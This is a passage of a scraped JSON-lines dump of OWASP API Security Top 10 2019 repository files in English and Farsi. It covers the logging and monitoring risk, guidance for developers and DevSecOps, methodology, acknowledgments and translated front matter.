6 digits token.\n\n## How To Prevent\n\n* Inventory all API hosts and document important aspects of each one of them,\n  focusing on the API environment (e.g., production, staging, test,\n  development), who should have network access to the host (e.g., public,\n  internal, partners) and the API version.\n* Inventory integrated services and document important aspects such as their\n  role in the system, what data is exchanged (data flow), and its sensitivity.\n* Document all aspects of your API such as authentication, errors, redirects,\n  rate limiting, cross-origin resource sharing (CORS) policy and endpoints,\n  including their parameters, requests, and responses.\n* Generate documentation automatically by adopting open standards. Include the\n  documentation build in your CI/CD pipeline.\n* Make API documentation available to those authorized to use the API.\n* Use external protection measures such as API security firewalls for all exposed versions of your APIs, not just for the current production version.\n* Avoid using production data with non-production API deployments. If this is unavoidable, these endpoints should get the same security treatment as the production ones.\n* When newer versions of APIs include security improvements, perform risk analysis to make the decision of the mitigation actions required for the older version: for example, whether it is possible to backport the improvements without breaking API compatibility or you need to take the older version out quickly and force all clients to move to the latest version.\n\n## References\n\n### External\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:27.352515"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Insufficient Logging & Monitoring\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **2** | Prevalence **3** : Detectability **1** | Technical **2** : Business Specific |\n| Attackers take advantage of lack of logging and monitoring to abuse systems without being noticed. | Without logging and monitoring, or with insufficient logging and monitoring, it is almost impossible to track suspicious activities and respond to them in a timely fashion. | Without visibility over on-going malicious activities, attackers have plenty of time to fully compromise systems. |\n\n## Is the API Vulnerable?\n\nThe API is vulnerable if:\n\n* It does not produce any logs, the logging level is not set correctly, or log\n  messages do not include enough detail.\n* Log integrity is not guaranteed (e.g., [Log Injection][1]).\n* Logs are not continuously monitored.\n* API infrastructure is not continuously monitored.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAccess keys of an administrative API were leaked on a public repository. The\nrepository owner was notified by email about the potential leak, but took more\nthan 48 hours to act upon the incident, and access keys exposure may have\nallowed access to sensitive data. Due to insufficient logging, the company is\nnot able to assess what data was accessed by malicious actors.\n\n### Scenario #2\n\nA video-sharing platform was hit by a “large-scale” credential stuffing attack.\nDespite failed logins being logged, no alerts were triggered during the timespan\nof the attack. As a reaction to user complaints, API logs were analyzed and the\nattack was detected. The company had to make a public announcement asking users\nto reset their passwords, and report the incident to regulatory authorities.\n\n## How To Prevent\n\n* Log all failed authentication attempts, denied access, and input validation\n  errors.\n* Logs should be written using a format suited to be consumed by a log\n  management solution, and should include enough detail to identify the\n  malicious actor.\n* Logs should be handled as sensitive data, and their integrity should be\n  guaranteed at rest and transit.\n* Configure a monitoring system to continuously monitor the infrastructure,\n  network, and the API functioning.\n* Use a Security Information and Event Management (SIEM) system to aggregate and\n  manage logs from all components of the API stack and hosts.\n* Configure custom dashboards and alerts, enabling suspicious activities to be\n  detected and responded to earlier.\n\n## References\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### External\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:27.585455"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xb0-next-devs.md", "content": "# What's Next For Developers\n\nThe task to create and maintain secure software, or fixing existing sofware, can be\ndifficult. APIs are no different.\n\nWe believe that education and awareness are key factors to write secure\nsoftware. Everything else required to accomplish the goal, depends on\n**establishing and using repeatable security processes and standard security\ncontrols**.\n\nOWASP has numerous free and open resources to address security since the very\nbeginning of the project. Please visit the [OWASP Projects page][1] for a\ncomprehensive list of available projects.\n\n| | |\n|-|-|\n| **Education** | You can start reading [OWASP Education Project materials][2] according to your profession and interest. For hands-on learning, we added **crAPI** - **C**ompletely **R**idiculous **API** on [our roadmap][3]. Meanwhile, you can practice WebAppSec using the [OWASP DevSlop Pixi Module][4], a vulnerable WebApp and API service intent to teach users how to test modern web applications and API's for security issues, and how to write more secure API's in the future. You can also attend [OWASP AppSec Conference][5] training sessions, or [join your local chapter][6]. |\n| **Security Requirements** | Security should be part of every project from the beginning. When doing requirements elicitation, it is important to define what \"secure\" means for that project. OWASP recommends you use the [OWASP Application Security Verification Standard (ASVS)][7] as a guide for setting the security requirements. If you're outsourcing, consider the [OWASP Secure Software Contract Annex][8], which should be adapted according to local law and regulations. |\n| **Security Architecture** | Security should remain a concern during all the project stages. The [OWASP Prevention Cheat Sheets][9] are a good starting point for guidance on how to design security in during the architecture phase. Among many others, you'll find the [REST Security Cheat Sheet][10] and the [REST Assessment Cheat Sheet][11]. |\n| **Standard Security Controls** | Adopting Standard Security Controls reduces the risk of introducing security weaknesses while writing your own logic. Despite the fact that many modern frameworks now come with built-in standard effective controls, [OWASP Proactive Controls][12] gives you a good overview of what security controls you should look to include in your project. OWASP also provides some libraries and tools you may find valuable, such as validation controls. |\n| **Secure Software Development Life Cycle** | You can use the [OWASP Software Assurance Maturity Model (SAMM)][13] to improve the process when building APIs. Several other OWASP projects are available to help you during the different API development phases e.g., the [OWASP Code Review Project][14]. |\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:27.697081"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xb1-next-devsecops.md", "content": "# What's Next For DevSecOps\n\nDue to their importance in modern application architectures, building secure\nAPIs is crucial. Security cannot be neglected, and it should be part of the\nwhole development life cycle. Scanning and penetration testing yearly are no\nlonger enough.\n\nDevSecOps should join the development effort, facilitating continuous security\ntesting across the entire software development life cycle. Their goal is to\nenhance the development pipeline with security automation, and without impacting\nthe speed of development.\n\nIn case of doubt, stay informed, and review, the [DevSecOps Manifesto][1] often.\n\n| | |\n|-|-|\n| **Understand the Threat Model** | Testing priorities come from a threat model. If you don't have one, consider using [OWASP Application Security Verification Standard (ASVS)][2], and the [OWASP Testing Guide][3] as an input. Involving the development team may help to make them more security-aware. |\n| **Understand the SDLC** | Join the development team to better understand the Software Development Life Cycle. Your contribution on continuous security testing should be compatible with people, processes, and tools. Everyone should agree with the process, so that there's no unnecessary friction or resistance. |\n| **Testing Strategies** | As your work should not impact the development speed, you should wisely choose the best (simple, fastest, most accurate) technique to verify the security requirements. The [OWASP Security Knowledge Framework][4] and [OWASP Application Security Verification Standard][5] can be great sources of functional and nonfunctional security requirements. There are other great sources for [projects][6] and [tools][7] similar to the one offered by the [DevSecOps community][8]. |\n| **Achieving Coverage and Accuracy** | You're the bridge between developers and operations teams. To achieve coverage, not only should you focus on the functionality, but also the orchestration. Work close to both development and operations teams from the beginning so you can optimize your time and effort. You should aim for a state where the essential security is verified continuously. |\n| **Clearly Communicate Findings** | Contribute value with less or no friction. Deliver findings in a timely fashion, within the tools development teams are using (not PDF files). Join the development team to address the findings. Take the opportunity to educate them, clearly describing the weakness and how it can be abused, including an attack scenario to make it real. |\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:27.803965"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xd0-about-data.md", "content": "# Methodology and Data\n\n## Overview\n\nSince the AppSec industry has not been specifically focused on the most recent\narchitecture of applications, in which APIs play an important role, compiling a\nlist of the ten most critical API security risks, based on a public call for\ndata, would have been a hard task. Despite there being no public data call, the\nresulting Top 10 list is still based on publicly available data, security\nexperts' contributions, and open discussion with the security community.\n\n## Methodology\n\nIn the first phase, publicly available data about APIs security incidents were\ncollected, reviewed, and categorized by a group of security experts. Such\ndata was collected from bug bounty platforms and vulnerability databases,\nwithin a one-year-old time frame. It was used for statistical purposes.\n\nIn the next phase, security practitioners with penetration testing experience\nwere asked to compile their own Top 10 list.\n\nThe [OWASP Risk Rating Methodology][1] was used to perform he Risk Analysis. The\nscores were discussed and reviewed between the security practitioners. For\nconsiderations on these matters, please refer to the [API Security Risks][2]\nsection.\n\nThe first draft of the OWASP API Security Top 10 2019 resulted from a consensus\nbetween statistical results from phase one, and the security practitioners'\nlists. This draft was then submitted for appreciation and review by another\ngroup of security practitioners, with relevant experience in the API security\nfields.\n\nThe OWASP API Security Top 10 2019 was first presented in the OWASP Global\nAppSec Tel Aviv event (May 2019). Since then, it has been available on GitHub\nfor public discussion and contributions.\n\nThe list of contributors is available in the [Acknowledgments][3] section.\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:27.920173"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/en/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/en/0xd1-acknowledgments.md", "content": "# Acknowledgments\n\n## Acknowledgments to Contributors\n\nWe’d like to thank the following contributors who contributed publicly on GitHub\nor via other means:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n", "timestamp": "2025-10-24T22:26:28.035867"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\n10 ریسک بحرانی امنیت API از منظر OWASP - 2019\n\n29 می 2019\n\n![WASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | <div dir=\"rtl\" align='right'> این اثر تحت مجوز زیر توسعه داده شده است: </div> [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: https://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:28.694801"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x00-notice.md", "content": "# اطلاعیه\n\nاین نسخه متنی OWASP API Security Top 10 است. به عنوان مرجع برای نسخه رسمی منتشر شده، در قالب یک سند قابل حمل  (PDF) استفاده می شود.\n\nمشارکت در پروژه مانند نظرات، اصلاحات یا ترجمه ها باید در اینجا انجام شود. برای جزئیات بیشتر در مورد نحوه مشارکت، لطفاً به CONTRIBUTING.md مراجعه فرمایید.\n\n* Erez Yallon\n* Inon Shkedy\n\n\n\n", "timestamp": "2025-10-24T22:26:28.805072"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x00-toc.md", "content": "# فهرست مطالب\n\n* [ فهرست مطالب](0x00-toc.md)\n* [درباره OWASP](0x01-about-owasp.md)\n* [ پیش‌گفتار](0x02-foreword.md)\n* [ مقدمه](0x03-introduction.md)\n* [ یادداشت](0x04-release-notes.md)\n* [ ریسک‌های امنیت API](0x10-api-security-risks.md)\n* [ ده ریسک امنیت API OWASP 2019](0x11-t10.md)\n* [API1:2019 مجوزدهی نادرست در سطح اشیا](0xa1-broken-object-level-authorization.md)\n* [API2:2019 احرازهویت نادرست کاربر](0xa2-broken-user-autentication.md)\n* [API3:2019 افشای مفرط داده](0xa3-excessive-data-exposure.md)\n* [API4:2019 کمبود منابع و نبود محدودیت بر نرخ ارسال](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 مجوزدهی نادرست در سطح توابع](0xa5-broken-function-level-authorizaion.md)\n* [API6:2019 تخصیص جمعی](0xa6-mass-assignment.md)\n* [API7:2019 پیکربندی امنیتی نادرست](0xa7-security-misconfiguration.md)\n* [API8:2019 تزریق ورودی‌های مخرب](0xa8-injections.md)\n* [API9:2019 مدیریت نادرست دارایی‌ها](0xa9-improper-asset-management.md)\n* [API10:2019 پایش و نظارت ناکافی](0xaa-insufficient-monitoring.md)\n* [ادامه برای توسعه دهندگان](0xb0-next-devs.md)\n* [ ادامه برای DevSecOps](0xb1-next-devsecops.md)\n* [ متدولوژی و داده](0xd0-about-data.md)\n* [سپاسگزاری](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:29.015934"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x01-about-owasp.md", "content": "# درباره OWASP\n\nپروژه بازمتن امنیت وب اپلیکیشن‌ها (OWASP)  جامعه ای باز و آزاد است که اختصاصا در حوزه توانمندسازی سازمان‌ها در حوزه توسعه، تهیه و ایجاد اپلیکیشن‌ها و APIهای قابل اعتماد فعالیت دارد.\n \n در OWASP، موارد زیر را بصورت رایگان و آزاد خواهید یافت:\n\n* استانداردها و ابزارهای امنیت اپلیکیشن.\n* کتاب‌هایی درباره تست امنیت اپلیکیشن‌ها، توسعه ایمن کد و بازبینی امنیت کد.\n* ارائه‌ها و [ویدئوها][1].\n* [راهنما و برگه تقلب][2] برای بسیاری از موضوعات رایج.\n* کنترل‌ها و کتابخانه‌های استاندارد در حوزه امنیت.\n* [شعب محلی در سرتاسر جهان.][3]\n* تحقیقات به روز و پیشرو در حوزه امنیت.\n* [کنفرانس‌های تخصصی][4] در سرتاسر جهان.\n* [یست‌های پست الکترونیک][5] برای ارسال اخبار.\n\nاطلاعات بیشتر در: https://owasp.org\n\nتمامی ابزارها، مستندات، ویدئوها، ارائه‌ها و شعب OWASP رایگان بوده و استفاده از یا مشارکت در آنها برای کلیه افرادی که تمایل به بهبود امنیت اپلیکیشن‌ها دارند، آزاد است.\n\nدر OWASP امنیت اپلیکیشن بعنوان مساله‌ای مهم از منظر افراد، فرایندها و فناوری‌ها در نظر گرفته می‌شود چرا که موثرترین رویکردها در امنیت اطلاعات نیز به بهبود در این حوزه‌ها نیاز دارند.\n\nOWASP تعریف جدیدی از سازمان ارائه می‌دهد. رهایی از بند فشار مسائل مالی امکان فراهم آوردن اطلاعات بیطرفانه، عملی و مقرون به صرفه در حوزه امنیت اپلیکیشن‌ها را به ما داده است.\n\nOWASP به هیچ کمپانی فناوری وابستگی ندارد اگرچه از استفاده آگاهانه از فناوری‌های تجاری در حوزه امنیت نیز حمایت می‌کنیم. OWASP انواع مختلفی از اطلاعات را به گونه‌ای همکارانه، شفاف و باز ارائه می‌دهد.\n\nبنیاد OWASP موجودیتی غیرانتفاعی و عام المنفعه است که توفیق بلند مدت پروژه OWASP را تضمین می‌نماید. تقریبا تمامی کسانی که با OWASP پیوند دارند، از قبیل اعضای هیئت مدیره، روسای شعبه‌ها، راهبران پروژه‌ها و اعضای پروژه‌ها داوطلبانه این همکاری را انجام می‌دهند. همچنین ما از تحقیقات نوآورانه در حوزه امنیت با ارائه کمک‌های مالی و زیرساختی حمایت می‌کنیم.\n\nبه ما بپیوندید!\n\n## حق چاپ و مجوز\n\n![license](images/license.png)\n\nحق چاپ © 2003-2019 بنیاد OWASP. این اثر تحت مجوز [Creative Commons Attribution ShareAlike 4.0 International License][7] توسعه داده شده است. برای هرگونه استفاده مجدد یا انتشار، باید شرایط مجوز این اثر را برای دیگران شفاف نمایید.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://owasp.org/index.php/OWASP_Chapter\n[4]: https://owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:29.131817"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x02-foreword.md", "content": "# پیش‌گفتار\n\nدر دنیای مبتنی بر App امروز، یکی از ابعاد بنیادین نوآوری واسط برنامه نویسی اپلیکیشن  یا همان APIها هستند. از بانک‌‌ها گرفته تا خرده فروشی‌‌ها، حوزه حمل نقل، اینترنت اشیا، وسائل نقلیه خودران و شهرهای هوشمند، APIها بخشی حیاتی از اپلیکیشن‌‌های موبایل، وب و SaaS به شمار می‌آیند.\n\nذاتا APIها منطق اپلیکیشن و داده‌‌های حساسی PII (از قبیل داده‌‌هایی که به تنهایی و بدون نیاز به داده اضافی دیگر، هویت یک کاربر را عیان می کنند نظیر شماره ملی) را در معرض دید قرارداده و در نتیجه، به طور روزافزون توجه بخش بیشتری از مهاجمین را به خود جلب می‌نمایند. بدون داشتن APIهایی ایمن، توسعه سریع نوآوری‌‌های فناورانه، امکان پذیر نخواهد بود.\n\nاگر چه کماکان می‌توان از لیست ده آسیب‌پذیری امنیتی بحرانی وب اپلیکیشن‌‌ها نیز برای امنیت APIها بهره برد، اما با توجه به ماهیت خاص APIها نیاز به لیستی از تهدیدات امنیتی مختص آنها احساس می‌شود. مقوله امنیت API بر راهکارها و استراتژی‌‌های لازم برای فهم و رفع آسیب‌پذیری‌‌ها و تهدیدات امنیتی خاص و منحصر به APIها تمرکز دارد.\n\nاگر با [پروژه OWASP Top 10][1] آشنایی داشته باشید، شباهت‌‌هایی بین آن و مستند پیش رو خواهید یافت: هر دو با نیت فهم آسان توسط مخاطب و قابلیت بکارگیری و انطباق در سازمان تهیه شده‌اند. در صورتی که با مجموعه‌‌های OWASP Top 10 آشنایی ندارید، بهتر است پیش از رفتن به سراغ لیست اصلی، بخش‌‌های [ریسک‌‌های امنیتی API][2] و [متدلوژی و داده][3] از همین مستند را مطالعه نمایید.\n\nبا پرسش‌‌ها، نظرات و ایده‌‌های خود در GitHub پروژه می توانید در توسعه OWASP API Security Top 10 مشارکت کنید:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nدر اینجا می توانید OWASP API Security Top 10 را بیابید:\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nبدین وسیله از تمامی مشارکت کنندگان در این پروژه که با تلاش‌‌های خود در بوجود آمدن آن نقش داشته اند سپاسگزاریم. لیست تمامی آنها در [قسمت سپاسگزاری‌‌ها][4] قابل مشاهده است. متشکریم!\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:29.245341"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x03-introduction.md", "content": "# مقدمه\n\n## به OWASP API Security Top 10 – 2019 خوش آمدید!\n\nبه اولین ویراست ده ‌‌آسیب‌پذیری برتر امنیت API خوش آمدید. اگر با پروژه OWASP Top 10 آشنایی داشته باشید، شباهت‌هایی بین آن و مستند پیش رو خواهید یافت: هر دو با نیت فهم آسان توسط مخاطب و قابلیت بکارگیری و انطباق در سازمان تهیه شده‌اند. در غیر این صورت، پیش از مطالعه عمیق‌تر ریسک‌‌های بحرانی امنیت API بهتر است [صفحه ویکی پروژه امنیت API][1] را مطالعه نمایید.\n\nدر معماری اپلیکیشن‌‌های مدرن امروزی API نقش خیلی مهمی دارد. از آنجا که آگاهی بخشی امنیتی و نوآوری در این حوزه گام‌‌های مختلفی دارد، تمرکز بر نقاط ضعف رایج APIها اهمیت زیادی خواهد داشت.\n\nهدف اصلی مستند و پروژه ده ‌‌آسیب‌پذیری بحرانی امنیت API آموزش افراد دخیل در توسعه و نگهداری APIها از قبیل توسعه دهندگان، طراحان، معماران، مدیران و سازمان‌‌ها است.\n\nدر بخش [متدلوژی و داده][2]، اطلاعات بیشتری درباره نحوه ایجاد اولین نسخه از مستند حاضر خواهید یافت. در نسخه‌‌های آتی، جامعه امنیت را نیز دخیل نموده و به منظور دریافت داده‌‌های مرتبط، فراخوان عمومی خواهیم داد. در حال حاضر همگان را به مشارکت در [مخزن Github][3] یا [لیست پست الکترونیک][4] ما از طریق ارسال سوال، نظر و پیشنهاد تشویق می‌کنیم.\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:29.356415"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x04-release-notes.md", "content": "# یادداشت\n\nمستند پیش رو اولین ویراست ده ‌‌آسیب‌پذیری بحرانی امنیت API است و ما بنا برآن داریم که بصورت دوره‌ای، هر سه یا چهارسال یکبار، آن را بروزرسانی نماییم.\n\nبر خلاف نسخه حاضر، در نسخه‌های آتی برای دریافت داده‌های عمومی فراخوان داده و صنعت امنیت سایبری را نیز در تلاش خود سهیم خواهیم کرد. برای آشنایی بیشتر با نحوه آماده سازی این مستند می‌توانید به بخش [متدولوژی و داده][1] مراجعه نمایید. همچنین جزئیات ریسک‌های امنیتی مرتبط در بخش [ریسک‌‌‌های امنیتی API][2] قابل مطالعه هستند.\n\nفهم تغییرات اساسی در معماری اپلیکیشن‌ها در سالیان گذشته از اهمیت زیادی برخوردار است. امروره APIها نقشی کلیدی در معماری ریزسرویس‌ها ، اپلیکیشن‌های تک صفحه ای (SPA )، اپلیکیشن‌های موبایل، اینترنت اشیاء و ... دارند.\n\nپروژه ده آسیب‌پذیری بحرانی امنیت API تلاشی ضروری برای آگاهی بخشی در حوزه مسائل امنیتی APIهای مدرن به شمار می‌رود که بدون تلاش‌های داوطلبانه افراد متعدد، که در بخش [سپاسگزاری‌ها][3] از تمامی آنان نام برده شده، به سرانجام رساندن آن امکان پذیر نبود. متشکریم!\n\n\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:29.467779"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x10-api-security-risks.md", "content": "# ریسک‌‌‌های امنیتی API\n\nبه منظور تحلیل ریسک، از [متدولوژی رتبه بندی ریسک OWASP][1] استفاده شده است.\n\nجدول زیر، واژگان مرتبط با رتبه ریسک را مختصرا نشان می‌دهد.\n\n\n\n| عوامل تهدید | قابلیت بهره برداری | میزان شیوع آسیب‌پذیری| قابلیت شناسایی آسیب‌پذیری\t | پیامد فنی\t | تاثیر بر کسب و کار |\n|-------------|--------------------|---------------------|---------------------------|---------------|---------------------|\n| خاص API     | آسان: 3\t           | گسترده: 3\t         | آسان: 3\t                 | شدید: 3\t     | خاص کسب و کار       |\n| خاص API     | متوسط: 2\t       | متداول: 2\t         | متوسط: 2\t                 | متوسط: 2\t     | خاص کسب و کار       |\n| خاص API     | سخت: 1\t           | سخت: 1\t             | سخت: 1\t                 | جزئی: 1       | خاص کسب و کار       |\n\n**توجه:** در این رویکرد، نوع فناوری مورد استفاده و احتمال وقوع آسیب‌پذیری در رتبه ریسک تاثیر ندارند؛ بعبارت دیگر در این روش رتبه بندی ریسک، راهکار مورد استفاده برای پیاده سازی API ، با رویکردی مستقل از جزئیات فناوری به ارزیابی ریسک می‌پردازد. هرکدام از عوامل یاد شده می‌تواند در پیداکردن و سواستفاده از یک آسیب‌پذیری به مهاجم کمک بسزایی کند. این رتبه بندی تاثیر واقعی بر کسب و کارها را نشان نداده و این سازمان‌ها هستند که با توجه به نوع کسب و کار و فرهنگ سازمانی خود، در میزان پذیرش خطر امنیتی استفاده از اپلیکیشن‌ها و APIها تصمیم گیرنده هستند. هدف از مستند ده آسیب‌پذیری بحرانی امنیت API، تحلیل ریسک نیست.\n\n##  مراجع\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### خارجی\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:29.584173"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0x11-t10.md", "content": "# ده ‌‌‌آسیب‌پذیری بحرانی امنیت API از منظر OWASP – 2019\n\n| ریسک                                                         | توضیحات                                                                                                                                                                                                                                                                                                                                                                                              |\n|--------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| API1:2019 مجوزدهی نادرست در سطح اشیا                         | APIها معمولا توابع مدیریت کننده شناسه‌های اشیا را در معرض دید قرار داده و سطح حمله  گسترده ای را برای نقض کنترل دسترسی ایجاد می‌نمایند. کنترل‌های مجوزدهی در سطح اشیا بایستی در کلیه توابعی که با گرفتن ورودی از کاربر به منابع داده دسترسی دارند پیاده‌سازی شود.                                                                                                                                         |\n| API2:2019 احرازهویت نادرست کاربر                             | مکانیزم‌های احرازهویت غالبا به درستی پیاده‌سازی نشده و سبب دسترسی مهاجمین به توکن‌های احرازهویت و ربایش موقت یا دائمی هویت سایر کاربران با استفاده از نقایص این مکانیزم‌ها می شوند. نقض توانایی سیستم در شناسایی کلاینت یا کاربر، منجر به نقض امنیت API خواهد شد.                                                                                                                                         |\n| API3:2019 افشای مفرط داده                                    | با بکارگیری سرویس‌‌های عمومی API، توسعه دهندگان عملا تمامی ویژگی‌‌های اشیا را بدون درنظر گرفتن حساسیت تک تک آنها و صرفا با تکیه بر فیلترینگ داده پیش از نمایش به کاربر، توسط کلاینت، در معرض دید عموم قرار می‌دهند.                                                                                                                                                                                         |\n| API4:2019 کمبود منابع و نبود محدودیت نرخ در ارسال درخواست    | معمولا APIها هیچ محدودیتی بر اندازه یا تعداد منابع درخواستی توسط کلاینت یا کاربر اعمال نمی‌نمایند. این موضوع نه تنها با تاثیرگذاری منفی بر عملکرد سرور API می‌تواند منجر به حمله رد سرویس (DoS) شود، بلکه در را 